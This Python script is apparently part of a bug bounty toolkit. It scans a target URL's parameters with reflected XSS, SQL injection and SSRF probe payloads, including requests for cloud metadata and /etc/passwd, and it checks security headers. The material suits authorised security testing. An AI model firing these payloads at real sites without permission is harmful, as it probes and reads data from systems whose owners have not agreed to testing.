#!/usr/bin/env python3
"""Bug Bounty Vulnerability Scanner

Automated vulnerability scanning for common web vulnerabilities.
Part of Bug Bounty Super Agent Pack v4.

Usage:
    python scanner.py https://target.com --xss --sqli --ssrf
    python scanner.py https://target.com --all -o results.json
"""

import asyncio
import aiohttp
import argparse
import json
import re
import sys
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional


# ============================================================
# PAYLOADS
# ============================================================

XSS_PAYLOADS = [
    '<script>alert(document.domain)</script>',
    '<img src=x onerror=alert(document.domain)>',
    '<svg onload=alert(document.domain)>',
    '<svg/onload=alert(document.domain)>',
    '" onmouseover="alert(document.domain)"',
    "' onmouseover='alert(document.domain)'",
    '<details open ontoggle=alert(document.domain)>',
    '<img src=x onerror=alert`document.domain`>',
    '{{7*7}}',
    '${7*7}',
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION SELECT NULL--",
    "' AND SLEEP(5)--",
]

SQL_ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL",
    r"Warning.*?mysqli?",
    r"PostgreSQL.*?ERROR",
    r"Warning.*?pg_",
    r"OLE DB.*?SQL Server",
    r"ORA-[0-9]{4,5}",
    r"SQLite.*?Exception",
    r"Warning.*?sqlite",
    r"System\.Data\.SqlClient",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
    r"You have an error in your SQL syntax",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
]

SSRF_INDICATORS = [
    "root:x:0:0",
    "[fonts]",
    "ami-id",
    "instance-id",
    "computeMetadata",
]


# ============================================================
# SCANNER FUNCTIONS
# ============================================================

async def scan_xss(
    session: aiohttp.ClientSession,
    url: str,
    param: str,
) -> list[dict]:
    """Test for reflected XSS."""
    findings = []
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    for payload in XSS_PAYLOADS:
        try:
            test_params = params.copy()
            test_params[param] = payload
            new_query = urllib.parse.urlencode(test_params)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

            async with session.get(
                test_url, timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=True, ssl=False
            ) as resp:
                body = await resp.text(errors="ignore")
                if payload in body:
                    findings.append({
                        "type": "XSS",
                        "subtype": "Reflected",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "status": resp.status,
                        "evidence": "Payload reflected in response body",
                    })
                    print(f"  [!] XSS FOUND: {param} -> {payload[:50]}")
                    break  # One confirmed payload is enough
        except Exception:
            pass
    return findings


async def scan_sqli(
    session: aiohttp.ClientSession,
    url: str,
    param: str,
) -> list[dict]:
    """Test for SQL injection."""
    findings = []
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    original_value = params.get(param, "1")

    for payload in SQLI_PAYLOADS:
        try:
            test_params = params.copy()
            test_params[param] = original_value + payload
            new_query = urllib.parse.urlencode(test_params)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

            start = time.time()
            async with session.get(
                test_url, timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True, ssl=False
            ) as resp:
                elapsed = time.time() - start
                body = await resp.text(errors="ignore")

                # Error-based detection
                for pattern in SQL_ERROR_PATTERNS:
                    match = re.search(pattern, body, re.I)
                    if match:
                        findings.append({
                            "type": "SQLi",
                            "subtype": "Error-based",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "status": resp.status,
                            "evidence": match.group(0),
                        })
                        print(f"  [!] SQLi FOUND (error-based): {param} -> {payload}")
                        return findings  # Confirmed, stop testing

                # Time-based detection
                if elapsed >= 4.5 and "SLEEP" in payload.upper():
                    findings.append({
                        "type": "SQLi",
                        "subtype": "Time-based blind",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "status": resp.status,
                        "evidence": f"Response delayed {elapsed:.1f}s",
                    })
                    print(f"  [!] SQLi FOUND (time-based): {param} -> {elapsed:.1f}s delay")
                    return findings
        except Exception:
            pass
    return findings


async def scan_ssrf(
    session: aiohttp.ClientSession,
    url: str,
    param: str,
) -> list[dict]:
    """Test for SSRF."""
    findings = []
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    for payload in SSRF_PAYLOADS:
        try:
            test_params = params.copy()
            test_params[param] = payload
            new_query = urllib.parse.urlencode(test_params)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

            async with session.get(
                test_url, timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=False, ssl=False
            ) as resp:
                body = await resp.text(errors="ignore")
                for indicator in SSRF_INDICATORS:
                    if indicator in body:
                        findings.append({
                            "type": "SSRF",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "status": resp.status,
                            "evidence": indicator,
                        })
                        print(f"  [!] SSRF FOUND: {param} -> {payload}")
                        return findings
        except Exception:
            pass
    return findings


async def scan_headers(session: aiohttp.ClientSession, url: str) -> dict:
    """Analyze security headers."""
    try:
        async with session.get(
            url, timeout=aiohttp.ClientTimeout(total=10),
            allow_redirects=True, ssl=False
        ) as resp:
            headers = dict(resp.headers)
            security_headers = {
                "Strict-Transport-Security": headers.get("Strict-Transport-Security"),
                "Content-Security-Policy": headers.get("Content-Security-Policy"),
                "X-Frame-Options": headers.get("X-Frame-Options"),
                "X-Content-Type-Options": headers.get("X-Content-Type-Options"),
                "Referrer-Policy": headers.get("Referrer-Policy"),
                "Permissions-Policy": headers.get("Permissions-Policy"),
            }
            missing = [k for k, v in security_headers.items() if v is None]
            info_leak = {}
            for h in ["Server", "X-Powered-By", "X-AspNet-Version"]:
                if h in headers:
                    info_leak[h] = headers[h]

            return {
                "url": url,
                "security_headers": {k: v for k, v in security_headers.items() if v},
                "missing_headers": missing,
                "info_disclosure": info_leak,
            }
    except Exception as e:
        return {"url": url, "error": str(e)}


# ============================================================
# MAIN
# ============================================================

async def run_scan(args):
    """Main scanning logic."""
    all_findings = []
    url = args.url

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Extract parameters from URL
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))

        if not params and (args.xss or args.sqli or args.ssrf or args.all):
            print("[!] No parameters found in URL. Add ?param=value to test.")
            print("    Example: python scanner.py 'https://target.com/page?id=1' --all")

        # Scan each parameter
        for param in params:
            print(f"\n[*] Testing parameter: {param}")

            if args.xss or args.all:
                print(f"  [*] Testing XSS...")
                findings = await scan_xss(session, url, param)
                all_findings.extend(findings)

            if args.sqli or args.all:
                print(f"  [*] Testing SQLi...")
                findings = await scan_sqli(session, url, param)
                all_findings.extend(findings)

            if args.ssrf or args.all:
                print(f"  [*] Testing SSRF...")
                findings = await scan_ssrf(session, url, param)
                all_findings.extend(findings)

        # Security headers
        if args.headers or args.all:
            print(f"\n[*] Analyzing security headers...")
            header_analysis = await scan_headers(session, url)
            if header_analysis.get("missing_headers"):
                print(f"  [!] Missing headers: {', '.join(header_analysis['missing_headers'])}")
            if header_analysis.get("info_disclosure"):
                print(f"  [!] Info disclosure: {header_analysis['info_disclosure']}")
            all_findings.append({"type": "Header Analysis", **header_analysis})

    return all_findings


def main():
    parser = argparse.ArgumentParser(
        description="Bug Bounty Vulnerability Scanner v4",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("url", help="Target URL with parameters (e.g., https://target.com/page?id=1)")
    parser.add_argument("--xss", action="store_true", help="Test for XSS")
    parser.add_argument("--sqli", action="store_true", help="Test for SQL Injection")
    parser.add_argument("--ssrf", action="store_true", help="Test for SSRF")
    parser.add_argument("--headers", action="store_true", help="Analyze security headers")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    args = parser.parse_args()

    if not any([args.xss, args.sqli, args.ssrf, args.headers, args.all]):
        args.all = True

    print("=" * 60)
    print("  Bug Bounty Vulnerability Scanner v4")
    print(f"  Target: {args.url}")
    print(f"  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

    findings = asyncio.run(run_scan(args))

    print(f"\n{'=' * 60}")
    print(f"  SCAN COMPLETE")
    vuln_findings = [f for f in findings if f.get("type") not in ["Header Analysis"]]
    print(f"  Vulnerabilities found: {len(vuln_findings)}")
    print(f"{'=' * 60}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"\n[+] Results saved to: {args.output}")


if __name__ == "__main__":
    main()

